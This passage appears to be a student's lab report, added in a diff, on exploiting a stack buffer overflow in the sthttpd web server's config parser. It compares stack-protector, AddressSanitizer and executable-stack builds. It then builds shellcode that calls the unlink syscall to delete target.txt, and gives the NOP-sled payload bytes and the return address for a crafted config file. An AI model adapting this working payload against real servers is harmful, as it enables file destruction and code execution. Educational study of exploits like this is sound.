+   0x0000000000404d42 <+1122>:	mov    %rax,0x21122f(%rip)        # 0x615f78 <user>
+   0x0000000000404d49 <+1129>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404d4e <+1134>:	mov    %r13,%rsi
+   0x0000000000404d51 <+1137>:	mov    %rbp,%rdi
+   0x0000000000404d54 <+1140>:	callq  0x404670 <value_required>
+   0x0000000000404d59 <+1145>:	mov    %r13,%rdi
+   0x0000000000404d5c <+1148>:	callq  0x402880 <atoi@plt>
+   0x0000000000404d61 <+1153>:	mov    %eax,0x211251(%rip)        # 0x615fb8 <cgi_limit>
+   0x0000000000404d67 <+1159>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404d6c <+1164>:	mov    %r13,%rsi
+   0x0000000000404d6f <+1167>:	mov    %rbp,%rdi
+   0x0000000000404d72 <+1170>:	callq  0x404670 <value_required>
+   0x0000000000404d77 <+1175>:	mov    %r13,%rdi
+   0x0000000000404d7a <+1178>:	callq  0x404890 <e_strdup>
+   0x0000000000404d7f <+1183>:	mov    %rax,0x21123a(%rip)        # 0x615fc0 <cgi_pattern>
+   0x0000000000404d86 <+1190>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404d8b <+1195>:	mov    %r12,%rdi
+   0x0000000000404d8e <+1198>:	callq  0x4023e0 <fclose@plt>
+   0x0000000000404d93 <+1203>:	add    $0x70,%rsp
+   0x0000000000404d97 <+1207>:	pop    %rbx
+   0x0000000000404d98 <+1208>:	pop    %rbp
+   0x0000000000404d99 <+1209>:	pop    %r12
+   0x0000000000404d9b <+1211>:	pop    %r13
+   0x0000000000404d9d <+1213>:	pop    %r14
+=> 0x0000000000404d9f <+1215>:	retq   
+   0x0000000000404da0 <+1216>:	mov    %r13,%rsi
+   0x0000000000404da3 <+1219>:	mov    %rbp,%rdi
+   0x0000000000404da6 <+1222>:	callq  0x404630 <no_value_required>
+   0x0000000000404dab <+1227>:	movl   $0x1,0x2111f3(%rip)        # 0x615fa8 <no_empty_referers>
+   0x0000000000404db5 <+1237>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404dba <+1242>:	mov    %r13,%rsi
+   0x0000000000404dbd <+1245>:	mov    %rbp,%rdi
+   0x0000000000404dc0 <+1248>:	callq  0x404670 <value_required>
+   0x0000000000404dc5 <+1253>:	mov    %r13,%rdi
+   0x0000000000404dc8 <+1256>:	callq  0x404890 <e_strdup>
+   0x0000000000404dcd <+1261>:	mov    %rax,0x2111dc(%rip)        # 0x615fb0 <url_pattern>
+   0x0000000000404dd4 <+1268>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404dd9 <+1273>:	mov    %r13,%rsi
+   0x0000000000404ddc <+1276>:	mov    %rbp,%rdi
+   0x0000000000404ddf <+1279>:	callq  0x404670 <value_required>
+   0x0000000000404de4 <+1284>:	mov    %r13,%rdi
+   0x0000000000404de7 <+1287>:	callq  0x404890 <e_strdup>
+   0x0000000000404dec <+1292>:	mov    %rax,0x2111ad(%rip)        # 0x615fa0 <local_pattern>
+   0x0000000000404df3 <+1299>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404df8 <+1304>:	mov    0x211111(%rip),%rdi        # 0x615f10 <stderr@@GLIBC_2.2.5>
+   0x0000000000404dff <+1311>:	mov    0x2111f2(%rip),%rdx        # 0x615ff8 <argv0>
+   0x0000000000404e06 <+1318>:	mov    %rbp,%rcx
+   0x0000000000404e09 <+1321>:	mov    $0x40e720,%esi
+   0x0000000000404e0e <+1326>:	xor    %eax,%eax
+   0x0000000000404e10 <+1328>:	callq  0x4025f0 <fprintf@plt>
+   0x0000000000404e15 <+1333>:	mov    $0x1,%edi
+   0x0000000000404e1a <+1338>:	callq  0x4028d0 <exit@plt>
+   0x0000000000404e1f <+1343>:	mov    %r13,%rsi
+   0x0000000000404e22 <+1346>:	mov    %rbp,%rdi
+   0x0000000000404e25 <+1349>:	callq  0x404670 <value_required>
+   0x0000000000404e2a <+1354>:	mov    %r13,%rdi
+   0x0000000000404e2d <+1357>:	callq  0x404890 <e_strdup>
+   0x0000000000404e32 <+1362>:	mov    %rax,0x21112f(%rip)        # 0x615f68 <p3p>
+   0x0000000000404e39 <+1369>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404e3e <+1374>:	mov    %r13,%rsi
+   0x0000000000404e41 <+1377>:	mov    %rbp,%rdi
+   0x0000000000404e44 <+1380>:	callq  0x404670 <value_required>
+   0x0000000000404e49 <+1385>:	mov    %r13,%rdi
+   0x0000000000404e4c <+1388>:	callq  0x404890 <e_strdup>
+   0x0000000000404e51 <+1393>:	mov    %rax,0x211118(%rip)        # 0x615f70 <charset>
+   0x0000000000404e58 <+1400>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404e5d <+1405>:	mov    %r13,%rsi
+   0x0000000000404e60 <+1408>:	mov    %rbp,%rdi
+   0x0000000000404e63 <+1411>:	callq  0x404670 <value_required>
+   0x0000000000404e68 <+1416>:	mov    %r13,%rdi
+   0x0000000000404e6b <+1419>:	callq  0x404890 <e_strdup>
+   0x0000000000404e70 <+1424>:	mov    %rax,0x211109(%rip)        # 0x615f80 <pidfile>
+   0x0000000000404e77 <+1431>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404e7c <+1436>:	mov    %rbx,%rdi
+   0x0000000000404e7f <+1439>:	callq  0x402840 <perror@plt>
+   0x0000000000404e84 <+1444>:	mov    $0x1,%edi
+   0x0000000000404e89 <+1449>:	callq  0x4028d0 <exit@plt>
+   0x0000000000404e8e <+1454>:	mov    %r13,%rsi
+   0x0000000000404e91 <+1457>:	mov    %rbp,%rdi
+   0x0000000000404e94 <+1460>:	callq  0x404670 <value_required>
+   0x0000000000404e99 <+1465>:	mov    %r13,%rdi
+   0x0000000000404e9c <+1468>:	callq  0x404890 <e_strdup>
+   0x0000000000404ea1 <+1473>:	mov    %rax,0x2110e8(%rip)        # 0x615f90 <throttlefile>
+   0x0000000000404ea8 <+1480>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404ead <+1485>:	mov    %r13,%rsi
+   0x0000000000404eb0 <+1488>:	mov    %rbp,%rdi
+   0x0000000000404eb3 <+1491>:	callq  0x404670 <value_required>
+   0x0000000000404eb8 <+1496>:	mov    %r13,%rdi
+   0x0000000000404ebb <+1499>:	callq  0x404890 <e_strdup>
+   0x0000000000404ec0 <+1504>:	mov    %rax,0x2110d1(%rip)        # 0x615f98 <logfile>
+   0x0000000000404ec7 <+1511>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404ecc <+1516>:	mov    %r13,%rsi
+   0x0000000000404ecf <+1519>:	mov    %rbp,%rdi
+   0x0000000000404ed2 <+1522>:	callq  0x404670 <value_required>
+   0x0000000000404ed7 <+1527>:	mov    %r13,%rdi
+   0x0000000000404eda <+1530>:	callq  0x404890 <e_strdup>
+   0x0000000000404edf <+1535>:	mov    %rax,0x2110a2(%rip)        # 0x615f88 <hostname>
+   0x0000000000404ee6 <+1542>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404eeb <+1547>:	mov    %r13,%rsi
+   0x0000000000404eee <+1550>:	mov    %rbp,%rdi
+   0x0000000000404ef1 <+1553>:	callq  0x404630 <no_value_required>
+   0x0000000000404ef6 <+1558>:	movl   $0x0,0x2110c8(%rip)        # 0x615fc8 <do_global_passwd>
+   0x0000000000404f00 <+1568>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404f05 <+1573>:	mov    %r13,%rsi
+   0x0000000000404f08 <+1576>:	mov    %rbp,%rdi
+   0x0000000000404f0b <+1579>:	callq  0x404630 <no_value_required>
+   0x0000000000404f10 <+1584>:	movl   $0x1,0x2110ae(%rip)        # 0x615fc8 <do_global_passwd>
+   0x0000000000404f1a <+1594>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404f1f <+1599>:	mov    %r13,%rsi
+   0x0000000000404f22 <+1602>:	mov    %rbp,%rdi
+   0x0000000000404f25 <+1605>:	callq  0x404630 <no_value_required>
+   0x0000000000404f2a <+1610>:	movl   $0x0,0x211098(%rip)        # 0x615fcc <do_vhost>
+   0x0000000000404f34 <+1620>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404f39 <+1625>:	mov    %r13,%rsi
+   0x0000000000404f3c <+1628>:	mov    %rbp,%rdi
+   0x0000000000404f3f <+1631>:	callq  0x404630 <no_value_required>
+   0x0000000000404f44 <+1636>:	movl   $0x1,0x21107e(%rip)        # 0x615fcc <do_vhost>
+   0x0000000000404f4e <+1646>:	jmpq   0x404bd0 <read_config+752>
+End of assembler dump.
+   
+   Machine Instruction it failed at: retq
+   The code failed upon attempting to return from the read_config file because buffer overflow changed the return address. The code jumped to address 0 (given by port=0000... in my crash_test.txt) and
+tried to execute because we allowed an executable stack. Thus, the program tried to execute whatever is at address 0, which is nothing. After a while the backtrace gives up and crashes.
+
+8. In order to compile, first do 'mv config.h src/config.h' while in sthttpd-2.27.0.
+	Then, run 'gcc -S -O2 -I src/ -fno-inline -fstack-protector-strong src/thttpd.c'.
+	Move into src/thttpd-sp.s  'mv thttpd.s src/thttpd-sp.s'.
+
+	'gcc -S -static-libasan -O2 -I src/ -fno-inline -fsanitize=address src/thttpd.c'
+	'mv thttpd.s src/thttpd-as.s'
+
+	'gcc -S -O2 -I src/ -fno-inline -fno-stack-protector -zexecstack src/thttpd.c'
+	'mv thttpd.s src/thttpd-no.s'
+   To compare them, I put the handle_read function of each code into it's own text file.
+   This gives sp-handle_read.txt, as-handle_read.txt, and no-handle_read.txt.
+   The -as version is drastically different from -sp and -no, so I only used diff on -sp and -no.
+   Most of the diff file is made up of different label values, which we can ignore. 
+   The rest of it looks like this:
+	354,358c354,355
+< 	subq	$32, %rsp
+< 	.cfi_def_cfa_offset 48
+< 	movq	%fs:40, %rax
+< 	movq	%rax, 24(%rsp)
+< 	xorl	%eax, %eax
+---
+> 	subq	$16, %rsp
+> 	.cfi_def_cfa_offset 32
+   which proves that sp (with -fstack-protector-strong) uses %fs to implement canary stack checks.
+   -no does not use canaries (-fno-stack-protector), and thus takes out these checks.
+   Another example:
+	403,404d396
+< .L60:
+< 	call	__stack_chk_fail
+   And one more:
+	2353,2358c2316,2317
+< .L332:
+< 	movq	24(%rsp), %rax
+< 	xorq	%fs:40, %rax
+< 	jne	.L360
+< 	addq	$32, %rsp
+< 	.cfi_remember_state
+---
+> .L324:
+> 	addq	$16, %rsp
+   However, we also see this:
+	3114c3067,3078
+<       jmp     .L450
+---
+>       addq    $40, %rsp
+>       .cfi_remember_state
+>       .cfi_def_cfa_offset 40
+>       popq    %rbx
+>       .cfi_def_cfa_offset 32
+>       popq    %rbp
+>       .cfi_def_cfa_offset 24
+>       popq    %r12
+>       .cfi_def_cfa_offset 16
+>       popq    %r13
+>       .cfi_def_cfa_offset 8
+>       ret
+3117c3081,3082
+< .L457:
+---
+> .L447:
+>       .cfi_restore_state
+
+   which shows that NO's -zexecstack flag treats stack execution similar to a function call.  The .cfi_remember_state pushes the register rules onto an implicit stack to save them.  .cfi_restore_stack
+pops the saved register values off and restores the registers after stack execution happens.  This allows stack execution while still preserving the concept of callee vs caller saved registers.
+
+   Finally, we look at the AS version. It is more than twice as long as either of the other two functions in assembly code. It works by repeatedly checking shadow bytes throughout the code (see
+below), and jumping to a label that calls a reporting function if the bytes are ever not equal.  
+	shrq    $3, %rax 
+	cmpb    $0, 2147450880(%rax) 
+	jne     .L1177
+
+.L1177:
+        movq    %r14, %rdi
+        call    __asan_report_load8
+
+9. First, I wrote a program exploit.c that can delete an arbitrary target.txt file in the same directory.
+	#include <unistd.h>
+	int main() {
+	  unlink("target.txt");
+	}
+   I compiled this program with gcc exploit.c -o exploit and ran exploit to see if the practice target.txt file was deleted. It was, so I then performed objdump -d exploit > exploit.txt
+   The next step was to remove everything except the instructions in main (and
+the instructions in whatever main calls), and inline those instructions so we
+don't have to worry about jumps. Then, remove everything for each line of
+instruction except the hex bytes describing the operation (see below).
+  
+  400528:       55                      push   %rbp
+  400529:       48 89 e5                mov    %rsp,%rbp
+  40052c:       bf c4 05 40 00          mov    $0x4005c4,%edi
+  400400:       ff 25 12 0c 20 00       jmpq   *0x200c12(%rip)        # 601018 <_GLOBAL_OFFSET_TABLE_+0x18>
+  400406:       68 00 00 00 00          pushq  $0x0
+  4003f0:       ff 35 12 0c 20 00       pushq  0x200c12(%rip)        # 601008 <_GLOBAL_OFFSET_TABLE_+0x8>
+  4003f6:       ff 25 14 0c 20 00       jmpq   *0x200c14(%rip)        # 601010 <_GLOBAL_OFFSET_TABLE_+0x10>
+  400536:       b8 00 00 00 00          mov    $0x0,%eax
+  40053b:       5d                      pop    %rbp
+  40053c:       c3                      retq
+  40053d:       0f 1f 00                nopl   (%rax)
+
+	55
+	48 89 e5
+	bf c4 05 40 00
+	ff 25 12 0c 20 00
+	68 00 00 00 00
+	ff 35 12 0c 20 00
+	ff 25 14 0c 20 00
+	b8 00 00 00 00
+	5d
+	c3
+	0f 1f 00
+
+   Finally, use the hex2raw utility graciously provided by CMU to generate byte code.
+
+	UH<89>å¿Ä^E@^@ÿ%^R^L ^@h^@^@^@^@ÿ5^R^L ^@ÿ%^T^L ^@¸^@^@^@^@]Ã^O^_^@
+
+   Use gdb src/thttpd-no and set a breakpoint at the read_config file using (gdb) b read_config. Then,
+	(gdb) r -p 12540 -D -C crash_test.txt 
+	(gdb) info reg
+   From this we can see that the stack pointer at the start of the program is
+%rsp=0x7fffffffcf08, so that is the return address. I will put my executable
+code immediately after this address, at 0x7fffffffcf10.
+   I used (gdb) print &line to get the start address of the array of chars that
+we input information into which is 0x7fffffffce70. Subtracting this from rsp
+above, we get 0x00A0, aka the size of 'port=000...000<returnaddress>' that we
+will need to have in our config file before inserting our exploit code. The
+port= up until return address takes up 152 characters of the file.
+Unfortunately, the hex of 20 is a space when byte-encoded to ascii, which
+causes an error in parsing because the program will view it as an independent
+word and try to read what follows the space as a config option, which it is
+clearly not. This gives us: src/thttpd-no: unknown config option
+'^@h^@^@^@^@ÿ5^R^L' Also, having the null bytes is a problem because they will
+cause the program to exit the loop and terminate prematurely (aka without
+reading the entirety of our exploit code), so execution will be affected.
+Below, I've written an optimized version of the above exploit code with
+different instructions in an attempt to use different byte enconding. This is
+possible using syscall. I have also removed the unecessary push, pop, ret, and
+nop instructions since all we care about are the mov and jumpinstructions that
+will execute the system call to remove target.  The value of "target.txt" is
+given by what's passed into
+%rdi before the jump above, which is 0x4005c4. syscall with an %rax of 87 will
+%call unlink according to https://filippo.io/linux-syscall-table/ .  mov
+%$0x57,%eax mov $0x4005c4,%edi syscall We get: b8 57 00 00 00 bf c4 05 40 00 0f
+%05	The resulting byte code is ¸W^@^@^@¿Ä^E@^@^O^E Unfortunately, this did
+%not work either due to the null bytes causing premature seg faults. The
+%instructions must be re-written to avoid null bytes. Take off the ending null
+%bytes as they do not impact the instruction.  b8 57 bf c4 05 40 0f 05 Byte
+%code is now ¸W¿Ä^E@^O^E but still doesn't work. 
+
+   Ok, moments of insight after reading and looking up resources. I need to
+take out the mov instruction that defines the absolute address of target.txt
+from my trial program and make a pointer to the target.txt file instead,
+placing the file name "./target.txt" at the end of the exploit code, followed
+by a null byte to terminate. Also, reverse the bytes describing addresses to account for a little endian machine.
+
+   Put target.txt right after port, at address 0x7fffffffce70+0x5=0x7fffffffce75.
+	movl $0x0057,%eax
+	movabs $0x7fffffffce75,%rdi
+	syscall
+   Put this into an assembly file, compile with -c, and objdump to get the byte code output.
+	b8 57 00 00 00 00
+	48 bf 75 ce ff ff ff 7f 00 00
+	0f 05
+   Use hex2raw on this output and get the raw to put in payload.txt.
+	objdump -d my_asm.o > hex.txt
+   Modify hex.txt to have just the byte values.
+	cat hex.txt | ./target1/hex2raw > b
+   We get ¸WH¿eÎÿÿÿ^?^@^@^O^E
+   Insert this into the payload.txt, put target.txt in there as specified.
+   The return address should be 00007fffffffcf10. Rewritten as little endian we get 10cfffffff7f0000. Then convert to raw ^@Ïÿÿÿ^?^@^@
+   The bytes are:
+	70 6F 72 74 3D 74 61 72 67 65 74 2e 74 78 74 00
+	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+	90 90 90 90 90 90 90 90 10 CF FF FF FF 7F 00 00
+	B8 57 00 00 00 48 BF 75 CE FF FF FF 7F 00 00 0F 05
+
+	cat hex.txt |./target1/hex2raw > smash.txt
+   IT WORKED!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+   target.txt:
+	Target file
+
+   smash.txt:
+	port=target.txt^@<90><90>(insert more nops here - see file I submitted with the lab)<90><90><90>^PÏÿÿÿ^?^@^@¸W^@^@^@H¿uÎÿÿÿ^?^@^@^O^E
+
+   Final Notes: I had the format right towards the end. However, I realized
+that the %rsp and &line I had copied down earlier were actually incorrect (by
+just a litle bit), and that's why my code wouldn't work even after all the
+fixes. I've gone back and edited the addresses everywhere in the code.
+Basically, I though &line was 7fffffffce60 instead of 7fffffffce70 and that
+%rsp was 0x7fffffffcfe8 instead of 0x7fffffffcf08. Also, we cannot run this
+exploit outside of gdb because ASLR will be enabled, and this exploit relies on
+exact address values. I had to shorten the port= lines I gave #9 because of the column width requirement, but will submit them separately.
+
+   Files I will also submit:
+   hex.txt containing the hex representation of my config file 
+   smash.txt containing the raw representation of my hex.txt that I passed in as a config file to run the exploit with
+   target.txt the file to be deleted
+   
+   I am not submitting some of the intermediary test files I used when I was
+playing around with generating an assembly file or testing to see what the raw
+values were for some hex, since these were just tests for my own understanding
+and not necessary to explain my exploit.
